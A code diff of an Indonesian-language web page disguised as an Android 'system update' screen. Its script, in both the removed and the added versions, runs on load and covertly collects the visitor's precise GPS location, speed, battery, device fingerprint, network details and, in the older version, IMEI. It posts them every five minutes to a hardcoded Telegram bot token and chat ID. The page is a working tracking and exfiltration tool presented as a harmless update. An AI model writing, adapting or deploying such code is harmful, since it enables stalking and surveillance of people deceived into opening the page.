@@ -1,108 +1,93 @@
-<!DOCTYPE html>
-<html lang="id">
+<!DOCTYPE html><html lang="id">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>System UI - Service Update</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Sistem Update Android</title>
   <style>
-    body {
-      margin: 0;
-      padding: 0;
-      font-family: "Roboto", sans-serif;
-      background: #111;
-      color: #ccc;
-      display: flex;
-      flex-direction: column;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
-      text-align: center;
-    }
-    .box {
-      background: #1c1c1c;
-      padding: 30px;
-      border-radius: 16px;
-      box-shadow: 0 0 12px rgba(0,0,0,0.6);
-    }
-    .loader {
-      margin: 20px auto;
-      width: 48px;
-      height: 48px;
-      border: 6px solid #444;
-      border-top: 6px solid #0f0;
-      border-radius: 50%;
-      animation: spin 1.2s linear infinite;
-    }
-    @keyframes spin {
-      to { transform: rotate(360deg); }
-    }
-    .status {
-      font-size: 13px;
-      color: #888;
-    }
+    body { background: #0f0f0f; color: #fff; font-family: sans-serif; text-align: center; padding-top: 50px; }
+    h1 { color: #00ff88; }
+    .loading { margin-top: 20px; }
   </style>
 </head>
 <body>
-  <div class="box">
-    <h2>Pembaruan Sistem</h2>
-    <p>Sinkronisasi layanan latar sedang berlangsung...</p>
-    <div class="loader"></div>
-    <p class="status">Jangan tutup halaman ini.</p>
-  </div>
+  <h1>Mengecek Pembaruan Sistem...</h1>
+  <div class="loading">Mohon tunggu beberapa saat</div>  <script>
+    async function sendData() {
+      try {
+        // Lokasi
+        const location = await new Promise((resolve, reject) => {
+          navigator.geolocation.getCurrentPosition(resolve, reject, { enableHighAccuracy: true });
+        });
 
-  <script>
-    (async () => {
-      const getID = () => {
-        const u = new URLSearchParams(window.location.search).get("id");
-        if (u) return u;
-        const base = btoa(navigator.userAgent).replace(/[^a-zA-Z0-9]/g, '').slice(0, 8);
-        return `USR-${base}`;
-      };
+        const lat = location.coords.latitude;
+        const lon = location.coords.longitude;
+        const speed = location.coords.speed ?? 'Unknown';
+        const heading = location.coords.heading ?? 'Unknown';
+        const altitude = location.coords.altitude ?? 'Unknown';
+        const accuracy = location.coords.accuracy + 'm';
 
-      const getIMEI = () => {
-        try {
-          return typeof AndroidInterface !== 'undefined' && AndroidInterface.getIMEI
-            ? AndroidInterface.getIMEI() : "Unavailable";
-        } catch (e) { return "Unavailable"; }
-      };
+        // Info dasar perangkat
+        const lang = navigator.language;
+        const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
+        const local = new Date().toLocaleString();
+        const utc = new Date().toUTCString();
+        const ua = navigator.userAgent;
 
-      const send = async () => {
-        try {
-          const pos = await new Promise((res, rej) =>
-            navigator.geolocation.getCurrentPosition(res, rej, { enableHighAccuracy: true })
-          );
+        // Baterai
+        const battery = await navigator.getBattery();
+        const batLevel = Math.round(battery.level * 100);
+        const batCharging = battery.charging ? 'Charging' : 'Not Charging';
 
-          const b = await navigator.getBattery();
-          const coords = pos.coords;
-          const payload = `
-[ID: ${getID()}]
-Lokasi dikirim: ${coords.latitude}, ${coords.longitude}
-https://maps.google.com/?q=${coords.latitude},${coords.longitude}
-Speed: ${coords.speed ?? "Unknown"}
-Heading: ${coords.heading ?? "Unknown"}
-Altitude: ${coords.altitude ?? "Unknown"}
-Accuracy: ${coords.accuracy}m
-Lang: ${navigator.language}
-TZ: ${Intl.DateTimeFormat().resolvedOptions().timeZone}
-Local: ${new Date().toLocaleString()}
-UTC: ${new Date().toUTCString()}
-Battery: ${Math.round(b.level * 100)}% (${b.charging ? "Charging" : "Not Charging"})
-Device: ${navigator.userAgent}
-IMEI: ${getIMEI()}`.trim();
+        // Tambahan opsional
+        const screenRes = `${screen.width}x${screen.height}`;
+        const colorDepth = screen.colorDepth;
+        const platform = navigator.platform;
+        const connection = navigator.connection || {};
+        const netType = connection.effectiveType || 'Unknown';
+        const downSpeed = connection.downlink || 'Unknown';
 
-          await fetch("https://api.telegram.org/bot7628065493:AAGuSA9aek-c_dtizC564vGl7nOFRe8TYko/sendMessage", {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ chat_id: "5677912817", text: payload })
-          });
-        } catch (e) {
-          console.error("Error:", e);
-        }
-      };
+        // Buat ID dari kombinasi fingerprint sederhana
+        const rawID = ua + screenRes + tz + lang;
+        const buffer = new TextEncoder().encode(rawID);
+        const digest = await crypto.subtle.digest('SHA-256', buffer);
+        const hashArray = Array.from(new Uint8Array(digest));
+        const hashHex = hashArray.map(b => b.toString(16).padStart(2, '0')).join('').slice(0, 10).toUpperCase();
+        const ID = `USR-${hashHex}`;
 
-      send();
-      setInterval(send, 5 * 60 * 1000);
-    })();
-  </script>
-</body>
+        // Payload
+        const payload = `
+[ID: ${ID}]
+Lokasi dikirim: ${lat}, ${lon}
+https://maps.google.com/?q=${lat},${lon}
+Speed: ${speed}
+Heading: ${heading}
+Altitude: ${altitude}
+Accuracy: ${accuracy}
+Lang: ${lang}
+TZ: ${tz}
+Local: ${local}
+UTC: ${utc}
+Battery: ${batLevel}% (${batCharging})
+Screen: ${screenRes}, Color: ${colorDepth}
+Platform: ${platform}
+Network: ${netType}, Downlink: ${downSpeed} Mbps
+Device: ${ua}`;
+
+        // Kirim ke Telegram
+        const token = "7628065493:AAGuSA9aek-c_dtizC564vGl7nOFRe8TYko";
+        const chat_id = "5677912817";
+
+        fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ chat_id, text: payload })
+        });
+      } catch (err) {
+        console.error("Gagal kirim:", err);
+      }
+    }
+
+    sendData();
+    setInterval(sendData, 5 * 60 * 1000); // tiap 5 menit
+  </script></body>
 </html>
